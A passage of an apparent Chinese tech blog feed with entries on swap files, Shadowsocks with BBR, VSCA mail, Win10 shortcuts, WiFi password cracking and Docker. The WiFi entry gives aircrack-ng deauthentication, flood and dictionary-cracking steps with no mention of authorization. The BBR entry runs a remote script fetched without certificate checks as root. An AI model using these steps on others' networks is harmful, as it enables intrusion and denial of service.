    <summary type="html">&lt;h2 id=&quot;一、缘由：&quot;&gt;&lt;a href=&quot;#一、缘由：&quot; class=&quot;headerlink&quot; title=&quot;一、缘由：&quot;&gt;&lt;/a&gt;一、缘由：&lt;/h2&gt;&lt;p&gt;最近爆出了Linux内核的高危漏洞，Linux 内核TCP SACK漏洞，需要升级内核或者打补丁做修补。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="系统" scheme="https://www.langxw.com/categories/%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Ubuntu" scheme="https://www.langxw.com/categories/%E7%B3%BB%E7%BB%9F/Ubuntu/"/>
    
    
    <category term="ubuntu" scheme="https://www.langxw.com/tags/ubuntu/"/>
    
    <category term="系统升级" scheme="https://www.langxw.com/tags/%E7%B3%BB%E7%BB%9F%E5%8D%87%E7%BA%A7/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu新增SWAP和调整SWAP大小</title>
    <link href="https://www.langxw.com/2021/02/02/Ubuntu%E6%96%B0%E5%A2%9ESWAP%E5%92%8C%E8%B0%83%E6%95%B4SWAP%E5%A4%A7%E5%B0%8F/"/>
    <id>https://www.langxw.com/2021/02/02/Ubuntu%E6%96%B0%E5%A2%9ESWAP%E5%92%8C%E8%B0%83%E6%95%B4SWAP%E5%A4%A7%E5%B0%8F/</id>
    <published>2021-02-02T02:13:23.000Z</published>
    <updated>2021-02-02T02:14:13.391Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、新增SWAP分区"><a href="#一、新增SWAP分区" class="headerlink" title="一、新增SWAP分区"></a>一、新增SWAP分区</h2><ol><li><p>查看内存情况：<code>free -m</code></p></li><li><p>创建一个新的swapfile文件<br><code>sudo dd if=/dev/zero of=swapfile bs=1M count=2048</code>,<br>创建2G的swap，大小为bs*count</p></li><li><p>把生成的文件转换成 Swap 文件 :<br><code>sudo mkswap swapfile</code></p></li><li><p>开启新的swap:<br><code>sudo swapon swap</code></p></li><li><p>激活 Swap 文件:<br><code>sudo swapon swapfile</code></p></li><li><p>查看swap内存:<br><code>free -m</code></p></li><li><p>设置开机启动</p><pre><code class="bash">cp /etc/fstab /etc/fstab.bak echo &#39;/swapfile none swap sw 0 0&#39; | sudo tee -a /etc/fstab</code></pre></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、新增SWAP分区&quot;&gt;&lt;a href=&quot;#一、新增SWAP分区&quot; class=&quot;headerlink&quot; title=&quot;一、新增SWAP分区&quot;&gt;&lt;/a&gt;一、新增SWAP分区&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;查看内存情况：&lt;code&gt;free -m&lt;/code&gt;&lt;/</summary>
      
    
    
    
    <category term="系统" scheme="https://www.langxw.com/categories/%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Ubuntu" scheme="https://www.langxw.com/categories/%E7%B3%BB%E7%BB%9F/Ubuntu/"/>
    
    
    <category term="ubuntu" scheme="https://www.langxw.com/tags/ubuntu/"/>
    
    <category term="swap" scheme="https://www.langxw.com/tags/swap/"/>
    
  </entry>
  
  <entry>
    <title>VPS搭建SS影梭服务端并优化加速Shadowsocks+BBR</title>
    <link href="https://www.langxw.com/2021/02/02/VPS%E6%90%AD%E5%BB%BASS%E5%BD%B1%E6%A2%AD%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%B9%B6%E4%BC%98%E5%8C%96%E5%8A%A0%E9%80%9FShadowsocks-BBR/"/>
    <id>https://www.langxw.com/2021/02/02/VPS%E6%90%AD%E5%BB%BASS%E5%BD%B1%E6%A2%AD%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%B9%B6%E4%BC%98%E5%8C%96%E5%8A%A0%E9%80%9FShadowsocks-BBR/</id>
    <published>2021-02-02T02:10:31.000Z</published>
    <updated>2021-03-16T12:00:35.018Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、缘由："><a href="#一、缘由：" class="headerlink" title="一、缘由："></a>一、缘由：</h2><p>　　之前自己花钱买了一年的SS影梭用来FQ，小200大洋，网速还不好，不稳定，瞬间感觉花了冤枉钱。这次借着公司</p><p>打算搞自己的VPN机会，买了个VPS，搭了个Shadowsocks服务端，并安装了加速器BBR。经过youtube带宽图测试，高清HD无压力。</p><p><strong>环境：Centos6.9 + Shadowsocks 2.8.2 (Python) +  Google TCP BBR 拥塞控制算法。</strong> <strong>VPS服务商 Vultr</strong></p><h2 id="二、解决办法："><a href="#二、解决办法：" class="headerlink" title="二、解决办法："></a>二、解决办法：</h2><h3 id="1、购买VPS-约等于云主机"><a href="#1、购买VPS-约等于云主机" class="headerlink" title="1、购买VPS (约等于云主机)"></a>1、购买VPS (约等于云主机)</h3><p>Vultr注册账号并充值后，新建VPS机器，选择日本地区机房和Centos6系统。（选日本是因为日本近，选Centos6 是因为内核升级和匹配方便和操作顺手） </p><h3 id="2、安装并配置Shadowsocks"><a href="#2、安装并配置Shadowsocks" class="headerlink" title="2、安装并配置Shadowsocks"></a>2、安装并配置Shadowsocks</h3><p>由于SS本身就是一个Python项目，这里就推荐使用最简单的Python版本。拿到服务器的IP和密码后，SSH到服务器上，已root用户执行如下命令。</p><p>1）服务端安装（Centos）：</p><pre><code class="bash">yum install python-setuptools &amp;&amp; easy_install pippip install shadowsocks</code></pre><p>安装加密包： pip install M2Crypto</p><p>2）配置SS配置文件</p><p>新建文件/etc/shadowsocks.json并写入以下内容：</p><pre><code class="bash">&#123;    &quot;server&quot;:&quot;my_server_ip&quot;,    &quot;server_port&quot;:12345,    &quot;local_address&quot;: &quot;127.0.0.1&quot;,    &quot;local_port&quot;:1080,    &quot;password&quot;:&quot;my_password&quot;,    &quot;timeout&quot;:300,    &quot;method&quot;:&quot;aes-256-cfb&quot;,&#125;</code></pre><p>my_server_ip 写服务器外网IP或者0.0.0.0，服务器端口号可以随意（大于1024即可），本地端口默认1080（socks5的国际惯例），</p><p>加密方式推荐asc-256-cfb安全性较高，但其他加密方式也可以。SS认证靠的是端口和密码的匹配，故可为不同的用户分配不同的端口和密码。</p><p>多用户模式配置：</p><pre><code class="bash">&#123;    &quot;server&quot;: &quot;0.0.0.0&quot;,    &quot;port_password&quot;: &#123;        &quot;8381&quot;: &quot;foobar1&quot;,        &quot;8382&quot;: &quot;foobar2&quot;,        &quot;8383&quot;: &quot;foobar3&quot;,        &quot;8384&quot;: &quot;foobar4&quot;    &#125;,    &quot;timeout&quot;: 300,    &quot;method&quot;: &quot;aes-256-cfb&quot;&#125;</code></pre><p>3）启动和停止</p><p>为了省事，先关闭防火墙 :</p><p>services iptables stop</p><p>启动SS：</p><p>ssserver -c /etc/shadowsocks.json -d start</p><p>停止SS：</p><p>ssserver -c /etc/shadowsocks.json -d stop</p><p>注意：安全起见，不建议关闭防火墙，写入让SS端口通过的防火墙规则即可。</p><h3 id="3、安装加速器Google-TCP-BBR"><a href="#3、安装加速器Google-TCP-BBR" class="headerlink" title="3、安装加速器Google TCP BBR"></a>3、安装加速器Google TCP BBR</h3><p>Google 开源了其 TCP BBR 拥塞控制算法，并提交到了 Linux 内核，最新的 4.11 版内核已经用上了该算法。根据以往的传统，Google 总是先在自家的</p><p>生产环境上线运用后，才会将代码开源，此次也不例外。根据实地测试，在部署了最新版内核并开启了TCP BBR 的机器上，网速甚至可以提升好几个数量级。</p><p>谷歌出品，必属精品！</p><p><strong>使用方法：</strong></p><p>root用户登录，运行以下命令：</p><pre><code class="bash">wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh</code></pre><p>安装完成后，脚本会提示需要重启 VPS，输入 y 并回车后重启。<br>重启完成后，进入 VPS，验证一下是否成功安装最新内核并开启 TCP BBR，输入以下命令：</p><pre><code class="bash">uname -r</code></pre><p>查看内核版本，含有 4.11 就表示 OK 了</p><pre><code class="bash">sysctl net.ipv4.tcp_available_congestion_control</code></pre><p>返回值一般为：net.ipv4.tcp_available_congestion_control = bbr cubic reno</p><pre><code class="bash">sysctl net.ipv4.tcp_congestion_control</code></pre><p>返回值一般为：net.ipv4.tcp_congestion_control = bbr</p><pre><code class="bash">sysctl net.core.default_qdisc</code></pre><p>返回值一般为：net.core.default_qdisc = fq</p><pre><code class="bash">lsmod | grep bbr</code></pre><p>返回值有 tcp_bbr 模块即说明bbr已启动。   </p><p>只要最后一步BBR模块启动成功即可，其他返回值可能有出入。</p><h2 id="三、VPN和SS对比"><a href="#三、VPN和SS对比" class="headerlink" title="三、VPN和SS对比:"></a>三、VPN和SS对比:</h2><p><img src="https://s2.ax1x.com/2019/05/16/EH4ONn.png"></p><h2 id="四、附录："><a href="#四、附录：" class="headerlink" title="四、附录："></a>四、附录：</h2><p>1、<a href="https://teddysun.com/489.html">BBR安装</a></p><p>2、<a href="http://www.vultryouhui.com/uncategorized/vultrdajiananzhuangvpnpptpjiaocheng.html">Vultr安装PPTP VPN</a></p><p>3、<a href="https://wenku.baidu.com/view/1b72f809da38376baf1faed2.html%20">VPN、SSH、SHADOWSCOKS 傻瓜图解</a></p><p>3、<a href="https://www.vultr.com/?ref=7167847">Vultr官网买送活动地址</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、缘由：&quot;&gt;&lt;a href=&quot;#一、缘由：&quot; class=&quot;headerlink&quot; title=&quot;一、缘由：&quot;&gt;&lt;/a&gt;一、缘由：&lt;/h2&gt;&lt;p&gt;　　之前自己花钱买了一年的SS影梭用来FQ，小200大洋，网速还不好，不稳定，瞬间感觉花了冤枉钱。这次借着公司&lt;/p</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="翻墙" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/%E7%BF%BB%E5%A2%99/"/>
    
    
    <category term="shadowsockets" scheme="https://www.langxw.com/tags/shadowsockets/"/>
    
    <category term="bbr" scheme="https://www.langxw.com/tags/bbr/"/>
    
    <category term="vultr" scheme="https://www.langxw.com/tags/vultr/"/>
    
  </entry>
  
  <entry>
    <title>VSCA发邮件配置</title>
    <link href="https://www.langxw.com/2021/02/02/VSCA%E5%8F%91%E9%82%AE%E4%BB%B6%E9%85%8D%E7%BD%AE/"/>
    <id>https://www.langxw.com/2021/02/02/VSCA%E5%8F%91%E9%82%AE%E4%BB%B6%E9%85%8D%E7%BD%AE/</id>
    <published>2021-02-02T02:08:20.000Z</published>
    <updated>2021-02-02T02:09:37.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、配置前提："><a href="#一、配置前提：" class="headerlink" title="一、配置前提："></a>一、配置前提：</h2><p>需要在警报定义那里，选择发邮件告警，并填写邮件地址（多个邮件地址用，隔开）</p><h2 id="二、发邮件方法："><a href="#二、发邮件方法：" class="headerlink" title="二、发邮件方法："></a>二、发邮件方法：</h2><h3 id="1、使用操作系统sendmail程序发邮件"><a href="#1、使用操作系统sendmail程序发邮件" class="headerlink" title="1、使用操作系统sendmail程序发邮件"></a>1、使用操作系统sendmail程序发邮件</h3><ol><li>使用命令行确认发邮件是否成功 <code>echo &quot;VSCA Mail Test&quot;| sendmail -s &quot;Test&quot; langxw@efushui.com</code></li><li>如果不成功，查看系统日志，看问题出在哪里。</li><li>如果成功，那么VSCA将会调用操作系统命令发邮件，可设置并触发一个告警事件进行测试（查系统日志）。</li></ol><h3 id="2、使用smtp调用外部邮件服务器发邮件"><a href="#2、使用smtp调用外部邮件服务器发邮件" class="headerlink" title="2、使用smtp调用外部邮件服务器发邮件"></a>2、使用smtp调用外部邮件服务器发邮件</h3><ol><li>在Vcenter Server - 管理 -  设置 - 常规里面设置SMTP服务器和发件人地址，在高级设置里设置mail的用户名和密码。</li><li>目前暂时没有成功发送邮件，暂时不知道问题出在哪。有报错，具体看系统日志。</li></ol><h2 id="三、参考："><a href="#三、参考：" class="headerlink" title="三、参考："></a>三、参考：</h2><ol><li><a href="https://blog.csdn.net/xiaoxiao__cc/article/details/81561272">Esxi6.5报警</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、配置前提：&quot;&gt;&lt;a href=&quot;#一、配置前提：&quot; class=&quot;headerlink&quot; title=&quot;一、配置前提：&quot;&gt;&lt;/a&gt;一、配置前提：&lt;/h2&gt;&lt;p&gt;需要在警报定义那里，选择发邮件告警，并填写邮件地址（多个邮件地址用，隔开）&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="虚拟化" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="VMware" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/VMware/"/>
    
    
    <category term="vsca" scheme="https://www.langxw.com/tags/vsca/"/>
    
  </entry>
  
  <entry>
    <title>Win10的便捷使用</title>
    <link href="https://www.langxw.com/2021/02/02/Win10%E7%9A%84%E4%BE%BF%E6%8D%B7%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.langxw.com/2021/02/02/Win10%E7%9A%84%E4%BE%BF%E6%8D%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2021-02-02T02:06:16.000Z</published>
    <updated>2021-02-02T02:07:47.490Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、Win10快捷键："><a href="#一、Win10快捷键：" class="headerlink" title="一、Win10快捷键："></a>一、Win10快捷键：</h2><ol><li><strong>Win+s</strong>  搜索（要先彻底关闭微软小娜，没用的家伙）</li><li><strong>Win+v</strong>  剪贴板</li><li><strong>Win+d</strong>   桌面</li><li><strong>Win+e</strong> 文件资源管理器</li><li><strong>Win+r</strong> 运行</li><li><strong>Win+x</strong> 快速链接菜单</li><li><strong>Win+w</strong> 工作区（便签，草图，截图）</li><li><strong>Win+p</strong> 投影</li><li><strong>Win+l</strong> 锁屏</li><li><strong>Alt+F4 / Ctrl+w</strong>关闭当前窗口</li><li><strong>F2</strong> 重命名文件</li><li><strong>Win + Pause</strong> 系统属性（我的电脑右键）</li><li><strong>Win + Ctrl + D</strong> 创建新的虚拟桌面</li><li>**Win + Ctrl + ←/→ ** 切换虚拟桌面</li><li><strong>Win + Ctrl + F4</strong> 关闭虚拟桌面</li><li><strong>Shift + 右键</strong> 再次打开Powershell 或者 linux shell</li><li><strong>桌面+Alt+F4</strong> 注销，关机，睡眠，切换用户</li><li>**Win + Alt + d ** 打开日历</li><li>**Win + i **  打开设置</li><li></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、Win10快捷键：&quot;&gt;&lt;a href=&quot;#一、Win10快捷键：&quot; class=&quot;headerlink&quot; title=&quot;一、Win10快捷键：&quot;&gt;&lt;/a&gt;一、Win10快捷键：&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Win+s&lt;/strong&gt;  搜索（要</summary>
      
    
    
    
    <category term="系统" scheme="https://www.langxw.com/categories/%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://www.langxw.com/categories/%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    
    <category term="win10" scheme="https://www.langxw.com/tags/win10/"/>
    
  </entry>
  
  <entry>
    <title>Wifi密码破解</title>
    <link href="https://www.langxw.com/2021/02/02/Wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>https://www.langxw.com/2021/02/02/Wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2021-02-02T02:02:18.000Z</published>
    <updated>2021-03-16T12:01:03.441Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、关闭网络和会影响到破解的进程"><a href="#1、关闭网络和会影响到破解的进程" class="headerlink" title="1、关闭网络和会影响到破解的进程"></a>1、关闭网络和会影响到破解的进程</h2><ol><li><code>service net-manager stop</code> 关闭网络功能</li><li> <code>airmon-ng check kill</code> 关闭相关进程</li></ol><h2 id="2、打开网络监听"><a href="#2、打开网络监听" class="headerlink" title="2、打开网络监听"></a>2、打开网络监听</h2><ol><li><code>iwconfig</code> 命令查看本机的网卡，可以看到无线网卡wlan0</li><li><code>airmon-ng</code> 命令列出支持监控模式的无线网卡，如没有输出，则表示本机无线网卡不支持监控模式。</li><li> <code>airmon-ng start wlan0</code> 打开网络监听，wlan0为你的无线网卡名称。如果有报错<code>Operation not possible due to RF-kill</code>，则手动关掉wifid的soft blocked，<code>rfkill list</code> , <code>rfkill unblock 2</code>。</li><li><code>airodump-ng wlan0mon</code> 监听所有wifi， wlan0mon 也可能是mon0，并记录BSSID, CH, ESSID, 考虑data列有数据的WIFI。BSSID是路由器的MAC地址，CH路由器WIFI频道，ESSID为WIFI的名字，<strong>窗口1</strong>。</li><li><code>airodump-ng --bssid xx:xx:xx:xx:xx:xx -c 1 -w ~/Desktop/cap/xxx.cap  wlan0mon</code> 监听特定的频道，不要结束此进程，不要关掉此窗口，<strong>窗口2</strong>。</li><li><code>aireplay-ng -0 2 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlan0mon</code> 获取握手包数据，新开一个终端执行，当上一步时间后面出现WAP handshake时说明获取成功。需要多尝试几次  ，<strong>窗口3</strong>。 或者 <code>aireplay-ng -0 0 -a 28:6C:07:53:53:80 wlam0mon</code> 进行洪水攻击，不断攻击，让所有设备下线。</li><li><code>aircrack-ng -w 1.txt tmp-02.cap</code> 硬破解密码，1.txt是密码包，temp-02.cap是握手包。会执行很长时间，直到提示key fund！<strong>窗口4</strong></li><li><code>airmon-ng stop wlan0mon</code> 关闭网络监听。</li><li><code>service network-manager start</code> 打开网络。</li></ol><h2 id="3、附录："><a href="#3、附录：" class="headerlink" title="3、附录："></a>3、附录：</h2><h3 id="1、使用显卡的运算能力"><a href="#1、使用显卡的运算能力" class="headerlink" title="1、使用显卡的运算能力"></a>1、使用显卡的运算能力</h3><p>如果你有一个强大的GPU，为什么不使用GPU跑字典呢？<br>Hashcat可以借助GPU的运算力破解各种不同算法的hash值。<br>下载时要注意选择正确的显卡类型（AMD、NVidia）。Kali Linux自带这个工具。<br>在破解cap文件之前，要把它转换为hccap文件：</p><p><code>aircrack-ng file.cap -J out.hccap</code></p><p>使用GPU破解hash：</p><p><code>hashcat -m 2500 out.hccap 字典文件</code></p><h3 id="2、参考链接："><a href="#2、参考链接：" class="headerlink" title="2、参考链接："></a>2、参考链接：</h3><p><a href="https://blog.csdn.net/GrayOnDream/article/details/51859688?locationNum=13">https://blog.csdn.net/GrayOnDream/article/details/51859688?locationNum=13</a></p><p><a href="https://blog.csdn.net/qq_37367124/article/details/79587713">https://blog.csdn.net/qq_37367124/article/details/79587713</a></p><p><a href="https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html">https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、关闭网络和会影响到破解的进程&quot;&gt;&lt;a href=&quot;#1、关闭网络和会影响到破解的进程&quot; class=&quot;headerlink&quot; title=&quot;1、关闭网络和会影响到破解的进程&quot;&gt;&lt;/a&gt;1、关闭网络和会影响到破解的进程&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;se</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="破解" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/%E7%A0%B4%E8%A7%A3/"/>
    
    
    <category term="aircrack-ng" scheme="https://www.langxw.com/tags/aircrack-ng/"/>
    
    <category term="arimon-ng" scheme="https://www.langxw.com/tags/arimon-ng/"/>
    
  </entry>
  
  <entry>
    <title>Docker基本操作</title>
    <link href="https://www.langxw.com/2021/02/02/Docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>https://www.langxw.com/2021/02/02/Docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</id>
    <published>2021-02-02T01:53:03.000Z</published>
    <updated>2021-02-02T01:56:46.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、基本命令"><a href="#一、基本命令" class="headerlink" title="一、基本命令"></a>一、基本命令</h2><p><code>docker pull nginx</code>  下载docker镜像</p><p><code>docker images</code>  查看目前下载的所有镜像</p><p><code>docker rmi nginx</code> 删除nginx镜像</p><p><code>docker save  nginx &gt; /tmp/nginx.tar</code> 保存nginx镜像</p><p><code>docker  load &lt; /tmp/nginx.tar</code>  手动载入nginx镜像</p><p><code>docker run -it nginx sh</code>  启动nginx镜像，并进入交互命令(sh)模式 ,run=create + start , -it是你需要交互的时候才用，平时用-d</p><p><code>docker ps </code> 查看正在运行的docker镜像</p><p><code>docker ps -a</code> 查看所有已创建docker镜像（已停止+在正运行）</p><p><code>docker rm -f container_id</code> 删除docker容器</p><p><code>docker container prune</code> 清除所有终止状态的容器</p><p><code>docker inspect names</code> 查看容器的所有信息</p><p><code>docker attach names/container_id</code>  进入容器方式1，大家共用一个tty，会互相影响，不推荐 </p><p><code>docker exec -it names/container_id sh</code>  进入容器方式2，拿到不同的tty，推荐，exit退出</p><p><code>nsenter -t $pid -m -i -u -n -p </code> 利用namespace进入容器，方式3，比较复杂，不推荐。</p><pre><code class="bash">pid = `docker inspect --format &quot;&#123;&#123;.State.Pid&#125;&#125;&quot; $1`nsenter -t $pid -m -u -i -n -p</code></pre><p><code>docker run -d --name my_nginx nginx</code> 后台方式运行nginx docker, -d</p><p><code>docker logs my_nginx </code> 查看my_nginx的日志</p><p><code>docker logs -f my_nginx</code> 不断刷新的查看my_nginx 日志</p><p><code>docker commit container_name image_name</code> 从改变的容器创建一个新镜像</p><p><code>docker tag image_id docker.io/username/iamge_name</code>  在本地对镜像打一个tag</p><p><code>docker push docker.io/username/image_name</code> 上传本地的镜像到docker hub</p><pre><code class="bash">docker logindocker imagesdocker tag image_id docker.io/username/image_namedocker push docker.io/username/image_name</code></pre><h2 id="二、网络命令："><a href="#二、网络命令：" class="headerlink" title="二、网络命令："></a>二、网络命令：</h2><h3 id="1、端口映射："><a href="#1、端口映射：" class="headerlink" title="1、端口映射："></a>1、端口映射：</h3><p><code>docker  run -d -P --name my_nginx nginx </code> 将容器暴露的端口随机映射到宿主机的端口</p><p><code>docker run -d -p 80:80 --name my_nginx nginx</code>  将docker容器的80端口映射到宿主机的80端口，-p</p><p>不做IP绑定，即0.0.0.0</p><p><code>dcoker run -d -p 127.0.0.1:80:80 --name my_nginx  nginx</code> 将docker容器的80端口映射到宿主机的80端口，并绑定127.0.0.1</p><h3 id="2、docker网络类型："><a href="#2、docker网络类型：" class="headerlink" title="2、docker网络类型："></a>2、docker网络类型：</h3><p><code>docker network ls</code> 查看docker可以设置的网络类型</p><pre><code class="bash">root@langxiaowei-pc:~# docker network lsNETWORK ID          NAME                DRIVER              SCOPE1fabfe0002bb        bridge              bridge              localf4400c8b1fe7        host                host                localcb0a51a6c279        none                null                local</code></pre><p><code>docker run -it --network=bridge alpine sh</code> 指定网络方式为桥接，启动容器，拿到172网段地址</p><p><code>docker run -it --network=host alpine sh</code> 指定网络方式为主机，启动容器，使用主机的所有网卡，没有自己的IP</p><p><code>docker run -it --network=none alpine sh</code> 指定网络方式为none，启动主机，只有本地回环网卡。</p><h3 id="3、网络互联："><a href="#3、网络互联：" class="headerlink" title="3、网络互联："></a>3、网络互联：</h3><h4 id="跨容器网络互联："><a href="#跨容器网络互联：" class="headerlink" title="跨容器网络互联："></a>跨容器网络互联：</h4><h4 id="旧版："><a href="#旧版：" class="headerlink" title="旧版："></a>旧版：</h4><p><code>docker run -d --name web1 -p 80:80 lxwno1/lang_nginx nginx </code></p><p><code>docker run -d --name web2 --link web1 -p 81:80 lxwno1/lang_nginx nginx</code></p><p>– link 将容器web2 连接到容器web1，即在web2中可以使用ping web1 找到web1，本质是修改了web2的hosts文件，标识web1 在哪里：<code>172.17.0.2    web1 ae63849bb54f</code>。 单方向的连接。</p><h4 id="新版："><a href="#新版：" class="headerlink" title="新版："></a>新版：</h4><pre><code class="bash">docker network create -d bridge my-netdocker run -it --rm --name busybox1 --network my-net busybox  shdocker run -it --rm --name busybox2 --network my-net busybox  shping busybox2ping busybox1</code></pre><p>创建自定义网络连接 my-net(-d 指定网络类型)。</p><p>创建容器busybox1和busybox2并加入自定义网络。</p><p>再每个容器中，互ping对方，通了。</p><h4 id="多容器互联："><a href="#多容器互联：" class="headerlink" title="多容器互联："></a>多容器互联：</h4><p>推荐使用Docker Compose。</p><h4 id="跨主机网络互联："><a href="#跨主机网络互联：" class="headerlink" title="跨主机网络互联："></a>跨主机网络互联：</h4><p><code>route add -net 192.168.1.0/24 -gw 10.0.0.157</code> 实现两台不同宿主机的docker直接网络沟通，添加一个路由表就好，网关指向宿主机的网卡IP。</p><h3 id="4、数据管理："><a href="#4、数据管理：" class="headerlink" title="4、数据管理："></a>4、数据管理：</h3><h4 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h4><h4 id="旧版（-v）："><a href="#旧版（-v）：" class="headerlink" title="旧版（-v）："></a>旧版（-v）：</h4><p><code>docker run -it -d -v /opt:/opt --name centos2 centos  bash</code></p><p><code>docker run -it -d -v /etc/hosts:/opt/hosts --name centos3 centos bash</code></p><p><code>docker run -it -d -v /etc/hosts:/opt/hosts:ro --name centos4 centos</code> bash</p><p>用 -v 参数，挂在宿主机的目录到容器，完成共享，可以作代码动态加载，-v 宿主机目录：容器目录，</p><p>要写绝对路径，而且俩个目录都要写。</p><h4 id="新版（–mount）："><a href="#新版（–mount）：" class="headerlink" title="新版（–mount）："></a>新版（–mount）：</h4><p>创建并查看数据卷信息：</p><pre><code class="bash">docker volume create my-voldocker volume lsdocker volume inspect my-voldocker volume rm my-vol</code></pre><p>启动一个挂载数据卷的容器：</p><pre><code class="bash">docker run -it -d --mount source=my-vol,target=/opt --name centos2 centos  bash</code></pre><p>挂载一个主机目录作为数据卷（只读）：</p><pre><code class="bash">docker run -it -d --mount type=bind,source=/etc/,target=/opt/,readonly --name centos3 centos bash</code></pre><p>挂载一个本地主机文件作为数据卷：</p><p><code>docker run -it -d --mount type=bind,source=$HOME/.bash_history,target=$HOME/.bash_history --name centos4 centos bash</code></p><p>这样就可以将容器中的命令记录在本地。  </p><h4 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h4><p><code>docker run -it -d --volumes-from centos3 --name centos6 centos bash</code></p><p>用 –volumes 参数，从另一个容器加载数据卷。</p><h2 id="三、Dokcerfile编写"><a href="#三、Dokcerfile编写" class="headerlink" title="三、Dokcerfile编写"></a>三、Dokcerfile编写</h2><h3 id="1、文件例子："><a href="#1、文件例子：" class="headerlink" title="1、文件例子："></a>1、文件例子：</h3><p>Dockerfile文件编写，以自制nginx镜像为例，如下：</p><pre><code class="bash">#This is a dockerfile for nginx#base mirrorFROM centos#maintainer informationMAINTAINER lxw lxwno.1@163.com# relate commandRUN rpm -ivh https://mirrors.aliyun.com/epel/7/x86_64/Packages/e/epel-release-7-11.noarch.rpmRUN yum install nginx -y#add filesADD index.html /usr/share/nginx/html/index.html#argumentsRUN echo &quot;daemon off;&quot; &gt;&gt; /etc/nginx/nginx.conf# expose portEXPOSE 80#exec commandCMD [&quot;nginx&quot;]</code></pre><h3 id="2、-制作镜像："><a href="#2、-制作镜像：" class="headerlink" title="2、 制作镜像："></a>2、 制作镜像：</h3><p><code>dcoekr build -t df_nginx:v1 .</code>  从当前目录的Dockerfile制作镜像，并指定名字和tag。</p><h3 id="3、验证并启动："><a href="#3、验证并启动：" class="headerlink" title="3、验证并启动："></a>3、验证并启动：</h3><p><code>dcoker images</code> 可以查看刚构建好的docker镜像。</p><p><code>docker -d --name my_nginx df_nginx</code>  启动镜像，注意命令后面不要加command 比如bash，不然bash会取代Dockerfile中写好的CMD命令 nginx，切忌。</p><p><code>dcoker ps -a</code> 查看docker镜像状态</p><p><code>docker exec -it my_nginx bash</code> 进入my_nginx容器</p><p><code>docker inspect my_nginx</code> 查看my_nginx  的IP</p><p><code>curl  ip</code> 验证Nginx 启动成功</p><h3 id="4、指令详解："><a href="#4、指令详解：" class="headerlink" title="4、指令详解："></a>4、指令详解：</h3><ol><li>Dockerfile是一行命令创建一层，所以所有命令尽量写入一行 ，通过 &amp;&amp;。要有清除动作。</li><li>每一个 RUN 都是启动一个容器、执行命令、然后提交存储层文件变更。</li><li>docker build 可以从Dockerfile、指定压缩包.tar、从标准输入中读取Dockerfile和压缩包，进行构建。</li><li>COPY指令用于文件复制，ADD指令在需要自动解压的场合才使用。可配合 –chown=<user>:<group></li><li>容器内的主进程要以前台方式运行，容器是进程不是虚拟机，没有后台服务的概念。容器的启动程序就是容器内的应用进程（CMD），容器就是为了主进程存在的，主进程退出，容器就没存在的意义了，从而退出。</li><li>CMD指令是容器启动命令，推荐格式是列表，例如 <code>CMD [&quot;nginx&quot;, &quot;-g&quot;, &quot;daemon off;&quot;]</code>，可以被docker run中的命令替换。</li><li>ENTYRPOINT 入口点指令，其内容可以是脚本可以是命令，用于接收来自CMD的指令当做参数，CMD内容可以来自Dockerfile，也可以来自docker run 中的 cmd。也可以被覆盖，需docker run 的参数 –entrypoint。</li><li> ENV设置环境变量，方便其他指令引用。也类似设置全局变量。容器运行的时候，就会有这些环境变量。</li><li>ARG构建参数，也是设置环境变量的，但是不会带到容器中去。会被–build-arg 覆盖。类似springboot启动命令对配置文件的选择。</li><li>VOLUME 